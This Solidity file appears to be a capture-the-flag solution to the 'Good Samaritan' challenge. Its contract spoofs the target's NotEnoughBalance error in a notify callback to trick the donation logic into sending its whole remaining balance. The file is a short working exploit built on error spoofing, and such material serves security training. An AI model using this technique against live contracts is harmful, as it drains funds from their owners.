// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// This exact error naming used in GoodSamaritan's requestDonation method will ensure it calls transferRemainder
error NotEnoughBalance();

interface GoodSamaritan {
  function requestDonation() external;
}

contract GoodSamaritanSolution {
  address _goodSamaritan;

  constructor(address goodSamaritan) {
    _goodSamaritan = goodSamaritan;
  }

  function notify(uint256 amount) external {
    // We know this will be 10 because Wallet calls donate10 which sends an amount of 10
    if(amount == 10) {
      revert NotEnoughBalance();
    }
  }

  function run() external {
    GoodSamaritan(_goodSamaritan).requestDonation();
  }
}
